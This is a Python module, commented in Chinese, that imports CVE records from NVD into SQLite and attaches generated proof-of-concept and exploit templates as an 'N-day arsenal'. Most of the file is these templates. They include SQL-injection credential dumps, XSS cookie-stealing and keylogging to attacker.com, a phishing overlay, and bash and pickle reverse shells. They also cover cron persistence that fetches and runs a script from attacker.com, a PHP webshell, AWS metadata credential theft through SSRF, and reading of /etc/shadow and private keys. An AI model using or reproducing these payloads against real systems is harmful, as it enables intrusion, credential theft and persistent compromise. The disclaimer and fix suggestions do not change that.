#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
nday_expander安全工具集成模块，提供相关安全工具的封装和调用。

模块功能：
    - 提供相关安全测试功能
    - 支持API调用和命令行使用
    - 与其他模块集成协作

注意事项：
    - 本模块仅用于授权的安全测试
    - 请勿用于非法用途
    - 使用前请确保已获得相关授权
"""

import json
import os
import sqlite3
import time
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum
from loguru import logger

try:
    import requests
except ImportError:
    requests = None
    logger.warning("requests未安装，NVD API功能不可用")


class Severity(Enum):
    """严重程度"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    NONE = "none"


@dataclass
class CVERecord:
    """CVE记录"""
    cve_id: str
    description: str = ""
    severity: str = "medium"
    cvss_score: float = 0.0
    cvss_vector: str = ""
    published_date: str = ""
    last_modified: str = ""
    vendor: str = ""
    product: str = ""
    cwe: str = ""
    references: List[str] = field(default_factory=list)
    poc: str = ""
    exp: str = ""
    fix_suggestion: str = ""
    in_the_wild: bool = False
    has_exploit: bool = False
    exploit_type: str = ""
    affected_versions: str = ""
    tags: List[str] = field(default_factory=list)


class NdayExpander:
    """Nday武器库扩充器"""

    NVD_API_URL = "https://services.nvd.nist.gov/rest/json/cves/2.0"
    NVD_API_KEY = os.getenv("NVD_API_KEY", "")

    def __init__(self, db_path: str = "./data/nday_arsenal_large.db"):
        """初始化NdayExpander实例。

        Args:
            self: 类实例。
        """
        self.db_path = db_path
        os.makedirs(os.path.dirname(db_path), exist_ok=True)
        self.conn = sqlite3.connect(db_path)
        self.conn.row_factory = sqlite3.Row
        self._init_db()
        logger.info(f"Nday武器库扩充器初始化完成，数据库: {db_path}")

    def _init_db(self):
        """初始化数据库"""
        self.conn.execute("""
            CREATE TABLE IF NOT EXISTS cve_records (
                cve_id TEXT PRIMARY KEY,
                description TEXT,
                severity TEXT,
                cvss_score REAL,
                cvss_vector TEXT,
                published_date TEXT,
                last_modified TEXT,
                vendor TEXT,
                product TEXT,
                cwe TEXT,
                `references` TEXT,
                poc TEXT,
                exp TEXT,
                fix_suggestion TEXT,
                in_the_wild INTEGER DEFAULT 0,
                has_exploit INTEGER DEFAULT 0,
                exploit_type TEXT,
                affected_versions TEXT,
                tags TEXT,
                created_at TEXT,
                updated_at TEXT
            )
        """)

        self.conn.execute("""
            CREATE INDEX IF NOT EXISTS idx_severity ON cve_records(severity)
        """)
        self.conn.execute("""
            CREATE INDEX IF NOT EXISTS idx_vendor_product ON cve_records(vendor, product)
        """)
        self.conn.execute("""
            CREATE INDEX IF NOT EXISTS idx_cwe ON cve_records(cwe)
        """)
        self.conn.execute("""
            CREATE INDEX IF NOT EXISTS idx_in_the_wild ON cve_records(in_the_wild)
        """)
        self.conn.execute("""
            CREATE INDEX IF NOT EXISTS idx_has_exploit ON cve_records(has_exploit)
        """)

        self.conn.commit()

    def import_from_nvd(self, keywords: List[str] = None, severity: str = None,
                        cvss_min: float = 7.0, limit: int = 1000,
                        start_date: str = None, end_date: str = None) -> int:
        """
        从NVD API批量导入CVE
        Args:
            keywords: 关键词列表（如 ["apache", "nginx", "mysql"]）
            severity: 严重程度过滤
            cvss_min: 最低CVSS分数
            limit: 最大导入数量
            start_date: 开始日期 (YYYY-MM-DD)
            end_date: 结束日期 (YYYY-MM-DD)
        Returns:
            导入数量
        """
        if requests is None:
            logger.error("requests未安装，无法从NVD导入")
            return 0

        imported = 0
        results_per_page = 2000
        start_index = 0

        params = {
            "resultsPerPage": results_per_page,
            "startIndex": start_index,
        }

        # 构建关键词搜索
        if keywords:
            keyword_search = " OR ".join([f"cpe:2.3:*:{kw}" for kw in keywords])
            params["cpeName"] = keyword_search

        # 严重程度过滤
        if severity:
            params["cvssV3Severity"] = severity.upper()

        # 日期范围
        if start_date:
            params["pubStartDate"] = f"{start_date}T00:00:00.000"
        if end_date:
            params["pubEndDate"] = f"{end_date}T23:59:59.999"

        headers = {}
        if self.NVD_API_KEY:
            headers["apiKey"] = self.NVD_API_KEY

        logger.info(f"开始从NVD导入CVE，参数: {params}")

        while imported < limit:
            try:
                params["startIndex"] = start_index
                resp = requests.get(self.NVD_API_URL, params=params, headers=headers, timeout=30)

                if resp.status_code == 403:
                    logger.warning("NVD API限流，等待6秒后重试...")
                    time.sleep(6)
                    continue
                elif resp.status_code != 200:
                    logger.error(f"NVD API请求失败: {resp.status_code} - {resp.text}")
                    break

                data = resp.json()
                vulnerabilities = data.get("vulnerabilities", [])
                total = data.get("totalResults", 0)

                if not vulnerabilities:
                    logger.info("没有更多CVE数据")
                    break

                logger.info(f"获取到 {len(vulnerabilities)} 条CVE，总计 {total} 条，已导入 {imported} 条")

                for vuln in vulnerabilities:
                    if imported >= limit:
                        break

                    cve_data = vuln.get("cve", {})
                    record = self._parse_nvd_cve(cve_data)

                    # CVSS过滤
                    if record.cvss_score < cvss_min:
                        continue

                    if self._save_cve(record):
                        imported += 1

                start_index += results_per_page

                # NVD API限流：无密钥时每6秒最多5次请求
                if not self.NVD_API_KEY:
                    time.sleep(6)
                else:
                    time.sleep(0.6)

            except Exception as e:
                logger.error(f"导入过程出错: {e}")
                time.sleep(10)
                continue

        logger.info(f"NVD导入完成，共导入 {imported} 条CVE记录")
        return imported

    def _parse_nvd_cve(self, cve_data: Dict) -> CVERecord:
        """解析NVD CVE数据"""
        cve_id = cve_data.get("id", "")

        # 描述
        descriptions = cve_data.get("descriptions", [])
        description = ""
        for desc in descriptions:
            if desc.get("lang") == "en":
                description = desc.get("value", "")
                break

        # CVSS评分
        cvss_score = 0.0
        cvss_vector = ""
        severity = "medium"

        metrics = cve_data.get("metrics", {})
        cvss_metrics = metrics.get("cvssMetricV31", []) or metrics.get("cvssMetricV30", [])

        if cvss_metrics:
            cvss_data = cvss_metrics[0].get("cvssData", {})
            cvss_score = cvss_data.get("baseScore", 0.0)
            cvss_vector = cvss_data.get("vectorString", "")
            severity = cvss_data.get("baseSeverity", "medium").lower()

        # CWE
        weaknesses = cve_data.get("weaknesses", [])
        cwe = ""
        if weaknesses:
            cwe_data = weaknesses[0].get("description", [])
            if cwe_data:
                cwe = cwe_data[0].get("value", "")

        # 参考链接
        references = []
        refs = cve_data.get("references", [])
        for ref in refs:
            url = ref.get("url", "")
            if url:
                references.append(url)

        # 厂商和产品（从CPE提取）
        vendor = ""
        product = ""
        configurations = cve_data.get("configurations", [])
        for config in configurations:
            nodes = config.get("nodes", [])
            for node in nodes:
                cpe_matches = node.get("cpeMatch", [])
                for cpe in cpe_matches:
                    criteria = cpe.get("criteria", "")
                    parts = criteria.split(":")
                    if len(parts) > 4:
                        vendor = parts[3]
                        product = parts[4]
                        break
                if product:
                    break
            if product:
                break

        # 日期
        published_date = cve_data.get("published", "")[:10]
        last_modified = cve_data.get("lastModified", "")[:10]

        # 自动生成POC/EXP模板
        poc, exp, fix_suggestion = self._generate_exploit_template(
            cve_id, cwe, vendor, product, description
        )

        # 标签
        tags = self._generate_tags(cwe, vendor, product, description, cvss_score)

        return CVERecord(
            cve_id=cve_id,
            description=description,
            severity=severity,
            cvss_score=cvss_score,
            cvss_vector=cvss_vector,
            published_date=published_date,
            last_modified=last_modified,
            vendor=vendor,
            product=product,
            cwe=cwe,
            references=references,
            poc=poc,
            exp=exp,
            fix_suggestion=fix_suggestion,
            in_the_wild=self._detect_in_the_wild(description, references),
            has_exploit=bool(poc or exp),
            exploit_type=self._detect_exploit_type(cwe, description),
            affected_versions="",
            tags=tags,
        )

    def _generate_exploit_template(self, cve_id: str, cwe: str, vendor: str,
                                     product: str, description: str) -> Tuple[str, str, str]:
        """根据CWE和描述自动生成POC/EXP模板"""
        cwe_lower = cwe.lower()
        desc_lower = description.lower()

        # SQL注入
        if "sql" in cwe_lower or "sql injection" in desc_lower:
            poc = f"""# {cve_id} SQL注入POC
# 目标: {vendor}/{product}
# 原理: 输入参数未经过滤，直接拼接到SQL查询中

import requests

target = "http://target.com/vulnerable_endpoint"
payload = "' OR '1'='1"

# 测试注入点
params = {"id": f"1{payload}"}
resp = requests.get(target, params=params)

if "error" in resp.text.lower() or resp.status_code == 500:
    print("[+] 可能存在SQL注入")
    print(f"[+] 响应: {resp.text[:200]}")

# 使用SQLMap进一步利用
# sqlmap -u "{target}?id=1" --dbs --batch
"""
            exp = f"""# {cve_id} SQL注入EXP
# 完整利用：获取数据库、表、列、数据

import requests

target = "http://target.com/vulnerable_endpoint"

# 1. 获取数据库列表
payload = "1 UNION SELECT group_concat(schema_name),2 FROM information_schema.schemata--"
params = {"id": payload}
resp = requests.get(target, params=params)
print(f"[+] 数据库: {resp.text[:500]}")

# 2. 获取表列表
payload = "1 UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database()--"
params = {"id": payload}
resp = requests.get(target, params=params)
print(f"[+] 表: {resp.text[:500]}")

# 3. 获取列列表
payload = "1 UNION SELECT group_concat(column_name),2 FROM information_schema.columns WHERE table_name='users'--"
params = {"id": payload}
resp = requests.get(target, params=params)
print(f"[+] 列: {resp.text[:500]}")

# 4. 获取数据
payload = "1 UNION SELECT group_concat(username,0x3a,password),2 FROM users--"
params = {"id": payload}
resp = requests.get(target, params=params)
print(f"[+] 用户数据: {resp.text[:500]}")
"""
            fix = "1. 使用参数化查询/预编译语句\n2. 对用户输入进行严格过滤和转义\n3. 使用ORM框架\n4. 最小权限原则配置数据库账户\n5. 开启数据库审计日志"

        # XSS
        elif "xss" in cwe_lower or "cross-site" in desc_lower or "scripting" in desc_lower:
            poc = f"""# {cve_id} XSS跨站脚本POC
# 目标: {vendor}/{product}

# 反射型XSS测试
http://target.com/search?q=<script>alert(document.cookie)</script>

# 存储型XSS测试
# 在评论/用户名等输入框中输入:
<script>alert('XSS')</script>

# DOM型XSS测试
http://target.com/#<script>alert(document.domain)</script>
"""
            exp = f"""# {cve_id} XSS利用EXP
# 窃取Cookie、键盘记录、钓鱼页面

# 1. 窃取Cookie
<script>
new Image().src='http://attacker.com/steal?cookie='+document.cookie;
</script>

# 2. 键盘记录
<script>
document.onkeypress = function(e) {{
    fetch('http://attacker.com/keylog?key='+e.key);
}};
</script>

# 3. 钓鱼页面
<script>
document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999"><h1>会话过期，请重新登录</h1><form action="http://attacker.com/phish"><input name="username"><input type="password" name="password"><button>登录</button></form></div>';
</script>
"""
            fix = "1. 对所有用户输出进行HTML实体编码\n2. 使用Content-Security-Policy (CSP)安全头\n3. 对输入进行白名单过滤\n4. 使用HttpOnly标记Cookie\n5. 启用XSS保护头 (X-XSS-Protection)"

        # RCE
        elif "code" in cwe_lower or "rce" in desc_lower or "remote code" in desc_lower or "command" in desc_lower:
            poc = f"""# {cve_id} 远程代码执行POC
# 目标: {vendor}/{product}

import requests

target = "http://target.com/vulnerable_endpoint"

# 测试命令执行
payload = "id"
# 根据具体漏洞点构造请求
# 示例1: 命令注入
params = {"cmd": f"; {payload}"}
resp = requests.get(target, params=params)

if "uid=" in resp.text:
    print("[+] 命令执行成功")
    print(f"[+] 输出: {resp.text}")

# 示例2: 反序列化
# import pickle, base64
# class Exploit:
#     def __reduce__(self):
#         return (os.system, ('id',))
# payload = base64.b64encode(pickle.dumps(Exploit())).decode()
"""
            exp = f"""# {cve_id} 远程代码执行EXP
# 反弹Shell + 权限提升 + 持久化

import requests
import base64

target = "http://target.com/vulnerable_endpoint"
attacker_ip = "YOUR_IP"
attacker_port = "4444"

# 1. 反弹Shell (Bash)
reverse_shell = f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"
encoded_shell = base64.b64encode(reverse_shell.encode()).decode()
payload = f"echo {encoded_shell} | base64 -d | bash"

# 发送Payload
params = {"cmd": f"; {payload}"}
requests.get(target, params=params)

# 2. 监听: nc -lvnp 4444

# 3. 权限提升 (获取后执行)
# sudo -l
# find / -perm -4000 2>/dev/null
# uname -a  # 检查内核漏洞

# 4. 持久化
# echo "*/1 * * * * curl http://attacker.com/shell | bash" | crontab -
# echo "ssh-rsa AAAA... attacker@host" >> ~/.ssh/authorized_keys
"""
            fix = "1. 禁止直接执行用户可控的命令\n2. 使用白名单限制可执行的命令\n3. 对输入进行严格过滤\n4. 以最小权限运行服务\n5. 定期更新软件和依赖库\n6. 部署WAF和入侵检测系统"

        # 文件上传
        elif "upload" in cwe_lower or "file upload" in desc_lower:
            poc = f"""# {cve_id} 文件上传漏洞POC
# 目标: {vendor}/{product}

import requests

target = "http://target.com/upload"

# 上传WebShell
webshell = '<?php system($_GET["cmd"]); ?>'
files = {"file": ("shell.php", webshell, "application/x-php")}

resp = requests.post(target, files=files)
print(f"[+] 上传响应: {resp.status_code} - {resp.text[:200]}")

# 访问WebShell
shell_url = "http://target.com/uploads/shell.php"
resp = requests.get(shell_url, params={"cmd": "id"})
if "uid=" in resp.text:
    print(f"[+] WebShell可用: {shell_url}")
    print(f"[+] 输出: {resp.text}")
"""
            exp = f"""# {cve_id} 文件上传利用EXP
# 绕过检测 + WebShell + 反弹Shell

import requests

target = "http://target.com/upload"
attacker_ip = "YOUR_IP"
attacker_port = "4444"

# 绕过方法:
# 1. 修改扩展名: shell.php5, shell.phtml, shell.php.jpg
# 2. 修改Content-Type: image/jpeg
# 3. 添加文件头: GIF89a
# 4. 双扩展名: shell.php.jpg
# 5. .htaccess: AddType application/x-httpd-php .jpg

# 完整WebShell (PHP)
webshell = f'''<?php
// 反弹Shell
if(isset($_GET["reverse"])) {{
    $sock=fsockopen("{attacker_ip}",{attacker_port});
    exec("/bin/sh -i <&3 >&3 2>&3");
}}
// 命令执行
if(isset($_GET["cmd"])) {{
    system($_GET["cmd"]);
}}
// 文件管理
if(isset($_GET["file"])) {{
    echo file_get_contents($_GET["file"]);
}}
?>'''

# 上传
files = {"file": ("shell.phtml", webshell, "image/jpeg")}
resp = requests.post(target, files=files)

# 触发反弹Shell
shell_url = "http://target.com/uploads/shell.phtml"
requests.get(shell_url, params={"reverse": "1"})
print(f"[+] 反弹Shell已触发，监听: nc -lvnp {attacker_port}")
"""
            fix = "1. 验证文件类型（检查文件内容，不仅是扩展名）\n2. 重命名上传文件（随机文件名）\n3. 将上传目录设置为不可执行\n4. 限制上传文件大小\n5. 使用独立域名存储上传文件\n6. 扫描上传文件中的恶意代码"

        # SSRF
        elif "ssrf" in cwe_lower or "server-side request" in desc_lower:
            poc = f"""# {cve_id} SSRF服务端请求伪造POC
# 目标: {vendor}/{product}

import requests

target = "http://target.com/fetch"

# 测试内网访问
params = {"url": "http://127.0.0.1:8080"}
resp = requests.get(target, params=params)
print(f"[+] 内网响应: {resp.status_code} - {resp.text[:200]}")

# 测试云元数据
params = {"url": "http://169.254.169.254/latest/meta-data/"}
resp = requests.get(target, params=params)
print(f"[+] 云元数据: {resp.status_code} - {resp.text[:200]}")

# 测试Redis
params = {"url": "gopher://127.0.0.1:6379/_INFO"}
resp = requests.get(target, params=params)
print(f"[+] Redis: {resp.status_code} - {resp.text[:200]}")
"""
            exp = f"""# {cve_id} SSRF利用EXP
# 内网扫描 + Redis攻击 + 云凭证窃取

import requests

target = "http://target.com/fetch"

# 1. 内网端口扫描
for port in [22, 80, 443, 3306, 6379, 8080, 9200]:
    params = {"url": f"http://127.0.0.1:{port}"}
    try:
        resp = requests.get(target, params=params, timeout=3)
        if resp.status_code != 500 and "connection refused" not in resp.text.lower():
            print(f"[+] 端口 {port} 开放: {resp.text[:100]}")
    except:
        pass

# 2. 云元数据凭证窃取 (AWS)
params = {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
resp = requests.get(target, params=params)
role_name = resp.text.strip()
print(f"[+] IAM角色: {role_name}")

params = {"url": f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"}
resp = requests.get(target, params=params)
print(f"[+] 临时凭证: {resp.text[:500]}")

# 3. Redis未授权访问 + 写SSH公钥
# gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/root/.ssh%0ACONFIG%20SET%20dbfilename%20authorized_keys%0ASET%20x%20%22%5Cn%5Cnssh-rsa%20AAAA...%5Cn%5Cn%22%0ASAVE%0A
"""
            fix = "1. 禁用不必要的协议（gopher, dict, file等）\n2. 限制请求目标为白名单域名\n3. 禁止访问内网IP段（10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x）\n4. 不跟随重定向\n5. 对响应内容进行过滤，不返回敏感信息\n6. 使用独立的网络隔离环境发起请求"

        # 路径遍历
        elif "path" in cwe_lower or "traversal" in desc_lower or "directory" in desc_lower:
            poc = f"""# {cve_id} 路径遍历POC
# 目标: {vendor}/{product}

import requests

target = "http://target.com/download"

# 测试路径遍历
payloads = [
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "/etc/passwd",
    "file:///etc/passwd",
]

for payload in payloads:
    params = {"file": payload}
    resp = requests.get(target, params=params)
    if "root:" in resp.text:
        print(f"[+] 路径遍历成功: {payload}")
        print(f"[+] 内容: {resp.text[:300]}")
        break
"""
            exp = f"""# {cve_id} 路径遍历利用EXP
# 读取敏感文件 + 源代码泄露 + 配置文件窃取

import requests

target = "http://target.com/download"

# 1. 读取系统敏感文件
sensitive_files = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/ssh/sshd_config",
    "/root/.ssh/id_rsa",
    "/root/.bash_history",
    "/proc/self/environ",
    "/var/log/auth.log",
]

for filepath in sensitive_files:
    params = {"file": f"../../../../..{filepath}"}
    resp = requests.get(target, params=params)
    if resp.status_code == 200 and len(resp.text) > 10:
        print(f"[+] 读取成功: {filepath}")
        print(f"[+] 内容: {resp.text[:300]}")
        print()

# 2. 读取Web应用配置
config_files = [
    "/var/www/html/.env",
    "/var/www/html/config.php",
    "/var/www/html/database.yml",
    "/var/www/html/wp-config.php",
]

# 3. 读取源代码
# /var/www/html/index.php
# /var/www/html/includes/db.php
"""
            fix = "1. 对用户输入进行规范化处理（realpath）\n2. 限制文件访问目录（chroot或白名单）\n3. 过滤路径遍历字符（.., %2e%2e等）\n4. 使用文件ID而非文件名\n5. 不直接返回文件内容，使用代理读取"

        # 反序列化
        elif "deserial" in cwe_lower or "deserialization" in desc_lower:
            poc = f"""# {cve_id} 反序列化漏洞POC
# 目标: {vendor}/{product}

import pickle
import base64
import requests

target = "http://target.com/api"

# Python反序列化Payload
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
resp = requests.post(target, data={"data": payload})
print(f"[+] 响应: {resp.status_code} - {resp.text[:200]}")

# Java反序列化 (ysoserial)
# java -jar ysoserial.jar CommonsCollections1 'id' > payload.ser
"""
            exp = f"""# {cve_id} 反序列化利用EXP
# RCE + 反弹Shell

import pickle
import base64
import requests
import os

target = "http://target.com/api"
attacker_ip = "YOUR_IP"
attacker_port = "4444"

# 反弹Shell Payload
class ReverseShell:
    def __reduce__(self):
        cmd = f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(ReverseShell())).decode()
print(f"[+] Payload: {payload[:100]}...")

# 发送
resp = requests.post(target, data={"data": payload})
print(f"[+] 已发送，监听: nc -lvnp {attacker_port}")

# Java反序列化利用链
# 1. CommonsCollections1-7
# 2. Spring1/2
# 3. Jdk7u21
# 4. Hibernate1
# 使用ysoserial生成: java -jar ysoserial.jar <payload_type> '<command>'
"""
            fix = "1. 避免反序列化不可信数据\n2. 使用白名单限制可反序列化的类\n3. 更新存在漏洞的库（CommonsCollections等）\n4. 使用安全的序列化格式（JSON）\n5. 对序列化数据进行签名验证"

        # 未授权访问
        elif "auth" in cwe_lower or "authorization" in desc_lower or "authentication" in desc_lower or "access control" in desc_lower:
            poc = f"""# {cve_id} 未授权访问/越权POC
# 目标: {vendor}/{product}

import requests

target = "http://target.com"

# 测试未授权访问接口
endpoints = [
    "/admin",
    "/api/users",
    "/api/config",
    "/api/debug",
    "/actuator",
    "/actuator/env",
    "/actuator/heapdump",
]

for endpoint in endpoints:
    resp = requests.get(f"{target}{endpoint}")
    if resp.status_code == 200 and len(resp.text) > 10:
        print(f"[+] 未授权访问: {endpoint}")
        print(f"[+] 内容: {resp.text[:200]}")
"""
            exp = f"""# {cve_id} 未授权访问利用EXP
# 信息泄露 + 权限提升 + 数据窃取

import requests

target = "http://target.com"

# 1. Spring Boot Actuator未授权
# /actuator/env - 环境变量（含数据库密码、API密钥）
# /actuator/heapdump - 堆转储（可提取密码）
# /actuator/mappings - 所有接口映射
# /actuator/beans - Spring Bean列表
# /actuator/configprops - 配置属性

# 2. 水平越权
# 修改用户ID参数访问其他用户数据
# GET /api/user/1 -> GET /api/user/2
# 修改Cookie/Token中的用户ID

# 3. 垂直越权
# 普通用户访问管理员接口
# 添加管理员权限参数: &role=admin
# 修改请求方法: POST /api/user -> PUT /api/admin/user

# 4. JWT伪造
# 算法混淆: alg: none
# 弱密钥爆破
# 伪造管理员Token
"""
            fix = "1. 对所有接口实施身份认证\n2. 实施基于角色的访问控制（RBAC）\n3. 验证用户对资源的所有权\n4. 禁用调试接口（Actuator等）\n5. 使用最小权限原则\n6. 对JWT进行严格验证（算法、过期时间、签名）"

        # 默认情况
        else:
            poc = f"""# {cve_id} POC模板
# 目标: {vendor}/{product}
# CWE: {cwe}
# 描述: {description[:200]}

# 根据具体漏洞类型构造POC
# 请参考漏洞详情和参考链接

import requests

target = "http://target.com/vulnerable_endpoint"

# 扩展点: 根据漏洞类型构造具体POC (调用poc_generator.generate(cve_id, vuln_type, target))
# 常见测试:
# 1. 输入特殊字符测试
# 2. 修改请求方法
# 3. 添加/修改请求头
# 4. 测试边界条件

resp = requests.get(target)
print(f"[+] 响应: {resp.status_code}")
print(f"[+] 内容: {resp.text[:500]}")
"""
            exp = f"""# {cve_id} EXP模板
# 目标: {vendor}/{product}
# CWE: {cwe}

# 完整利用步骤:
# 1. 信息收集
# 2. 漏洞验证
# 3. 漏洞利用
# 4. 权限提升
# 5. 持久化
# 6. 痕迹清除

# 请根据具体漏洞类型完善利用代码
"""
            fix = "1. 及时更新软件到最新版本\n2. 关注厂商安全公告\n3. 部署WAF进行防护\n4. 限制漏洞组件的访问\n5. 定期进行安全扫描"

        return poc, exp, fix

    def _generate_tags(self, cwe: str, vendor: str, product: str,
                       description: str, cvss_score: float) -> List[str]:
        """生成标签"""
        tags = []
        desc_lower = description.lower()

        # 基于CWE的标签
        cwe_tags = {
            "CWE-89": "sql-injection",
            "CWE-79": "xss",
            "CWE-78": "command-injection",
            "CWE-94": "code-injection",
            "CWE-502": "deserialization",
            "CWE-434": "file-upload",
            "CWE-22": "path-traversal",
            "CWE-918": "ssrf",
            "CWE-287": "authentication",
            "CWE-862": "authorization",
            "CWE-200": "info-disclosure",
            "CWE-119": "buffer-overflow",
            "CWE-264": "privilege-escalation",
        }
        if cwe in cwe_tags:
            tags.append(cwe_tags[cwe])

        # 基于描述的标签
        if "rce" in desc_lower or "remote code" in desc_lower:
            tags.append("rce")
        if "xss" in desc_lower or "cross-site" in desc_lower:
            tags.append("xss")
        if "sql" in desc_lower:
            tags.append("sql-injection")
        if "ssrf" in desc_lower:
            tags.append("ssrf")
        if "deserial" in desc_lower:
            tags.append("deserialization")
        if "upload" in desc_lower:
            tags.append("file-upload")
        if "traversal" in desc_lower or "directory" in desc_lower:
            tags.append("path-traversal")

        # 基于严重程度的标签
        if cvss_score >= 9.0:
            tags.append("critical")
        elif cvss_score >= 7.0:
            tags.append("high")

        # 厂商标签
        if vendor:
            tags.append(vendor.lower())
        if product:
            tags.append(product.lower())

        return list(set(tags))[:10]  # 最多10个标签

    def _detect_in_the_wild(self, description: str, references: List[str]) -> bool:
        """检测是否在野利用"""
        desc_lower = description.lower()
        wild_keywords = [
            "in the wild", "actively exploited", "exploited in the wild",
            "mass exploitation", "actively attacked", "under attack",
            "being exploited", "observed exploitation",
        ]

        for keyword in wild_keywords:
            if keyword in desc_lower:
                return True

        # 检查参考链接中是否有exploit-db或github
        for ref in references:
            if "exploit-db" in ref or "github.com" in ref:
                return True

        return False

    def _detect_exploit_type(self, cwe: str, description: str) -> str:
        """检测利用类型"""
        cwe_lower = cwe.lower()
        desc_lower = description.lower()

        if "sql" in cwe_lower or "sql injection" in desc_lower:
            return "sql-injection"
        elif "xss" in cwe_lower or "cross-site" in desc_lower:
            return "xss"
        elif "code" in cwe_lower or "rce" in desc_lower or "command" in desc_lower:
            return "rce"
        elif "upload" in cwe_lower or "file upload" in desc_lower:
            return "file-upload"
        elif "ssrf" in cwe_lower or "server-side request" in desc_lower:
            return "ssrf"
        elif "path" in cwe_lower or "traversal" in desc_lower:
            return "path-traversal"
        elif "deserial" in cwe_lower or "deserialization" in desc_lower:
            return "deserialization"
        elif "auth" in cwe_lower or "authorization" in desc_lower:
            return "auth-bypass"
        else:
            return "other"

    def _save_cve(self, record: CVERecord) -> bool:
        """保存CVE记录"""
        try:
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            # 检查是否已存在
            cursor = self.conn.execute("SELECT cve_id FROM cve_records WHERE cve_id = ?", (record.cve_id,))
            if cursor.fetchone():
                # 更新
                self.conn.execute("""
                    UPDATE cve_records SET
                        description=?, severity=?, cvss_score=?, cvss_vector=?,
                        published_date=?, last_modified=?, vendor=?, product=?,
                        cwe=?, `references`=?, poc=?, exp=?, fix_suggestion=?,
                        in_the_wild=?, has_exploit=?, exploit_type=?,
                        affected_versions=?, tags=?, updated_at=?
                    WHERE cve_id=?
                """, (
                    record.description, record.severity, record.cvss_score,
                    record.cvss_vector, record.published_date, record.last_modified,
                    record.vendor, record.product, record.cwe,
                    json.dumps(record.references), record.poc, record.exp,
                    record.fix_suggestion, int(record.in_the_wild),
                    int(record.has_exploit), record.exploit_type,
                    record.affected_versions, json.dumps(record.tags),
                    now, record.cve_id
                ))
            else:
                # 插入
                self.conn.execute("""
                    INSERT INTO cve_records (
                        cve_id, description, severity, cvss_score, cvss_vector,
                        published_date, last_modified, vendor, product, cwe,
                        `references`, poc, exp, fix_suggestion, in_the_wild,
                        has_exploit, exploit_type, affected_versions, tags,
                        created_at, updated_at
                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """, (
                    record.cve_id, record.description, record.severity,
                    record.cvss_score, record.cvss_vector, record.published_date,
                    record.last_modified, record.vendor, record.product, record.cwe,
                    json.dumps(record.references), record.poc, record.exp,
                    record.fix_suggestion, int(record.in_the_wild),
                    int(record.has_exploit), record.exploit_type,
                    record.affected_versions, json.dumps(record.tags),
                    now, now
                ))

            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"保存CVE失败 {record.cve_id}: {e}")
            return False

    def search(self, keyword: str = "", severity: str = None,
               vendor: str = None, product: str = None,
               cwe: str = None, in_the_wild: bool = None,
               has_exploit: bool = None, cvss_min: float = 0.0,
               limit: int = 50, offset: int = 0) -> Tuple[List[Dict], int]:
        """搜索CVE"""
        query = "SELECT * FROM cve_records WHERE 1=1"
        params = []

        if keyword:
            query += " AND (cve_id LIKE ? OR description LIKE ? OR vendor LIKE ? OR product LIKE ? OR tags LIKE ?)"
            kw = f"%{keyword}%"
            params.extend([kw, kw, kw, kw, kw])

        if severity:
            query += " AND severity = ?"
            params.append(severity)

        if vendor:
            query += " AND vendor LIKE ?"
            params.append(f"%{vendor}%")

        if product:
            query += " AND product LIKE ?"
            params.append(f"%{product}%")

        if cwe:
            query += " AND cwe = ?"
            params.append(cwe)

        if in_the_wild is not None:
            query += " AND in_the_wild = ?"
            params.append(int(in_the_wild))

        if has_exploit is not None:
            query += " AND has_exploit = ?"
            params.append(int(has_exploit))

        if cvss_min > 0:
            query += " AND cvss_score >= ?"
            params.append(cvss_min)

        # 统计总数
        count_query = query.replace("SELECT *", "SELECT COUNT(*)")
        total = self.conn.execute(count_query, params).fetchone()[0]

        # 分页查询
        query += " ORDER BY cvss_score DESC LIMIT ? OFFSET ?"
        params.extend([limit, offset])

        rows = self.conn.execute(query, params).fetchall()
        results = [dict(row) for row in rows]

        # 解析JSON字段
        for r in results:
            r['references'] = json.loads(r.get('references', '[]'))
            r['tags'] = json.loads(r.get('tags', '[]'))
            r['in_the_wild'] = bool(r.get('in_the_wild', 0))
            r['has_exploit'] = bool(r.get('has_exploit', 0))

        return results, total

    def get_statistics(self) -> Dict:
        """获取统计信息"""
        total = self.conn.execute("SELECT COUNT(*) FROM cve_records").fetchone()[0]

        severity_stats = {}
        for sev in ["critical", "high", "medium", "low"]:
            count = self.conn.execute("SELECT COUNT(*) FROM cve_records WHERE severity = ?", (sev,)).fetchone()[0]
            severity_stats[sev] = count

        in_the_wild = self.conn.execute("SELECT COUNT(*) FROM cve_records WHERE in_the_wild = 1").fetchone()[0]
        has_exploit = self.conn.execute("SELECT COUNT(*) FROM cve_records WHERE has_exploit = 1").fetchone()[0]

        # Top厂商
        top_vendors = self.conn.execute("""
            SELECT vendor, COUNT(*) as count FROM cve_records
            WHERE vendor != '' GROUP BY vendor ORDER BY count DESC LIMIT 10
        """).fetchall()

        # Top产品
        top_products = self.conn.execute("""
            SELECT product, COUNT(*) as count FROM cve_records
            WHERE product != '' GROUP BY product ORDER BY count DESC LIMIT 10
        """).fetchall()

        # Top CWE
        top_cwes = self.conn.execute("""
            SELECT cwe, COUNT(*) as count FROM cve_records
            WHERE cwe != '' GROUP BY cwe ORDER BY count DESC LIMIT 10
        """).fetchall()

        return {
            "total": total,
            "by_severity": severity_stats,
            "in_the_wild": in_the_wild,
            "has_exploit": has_exploit,
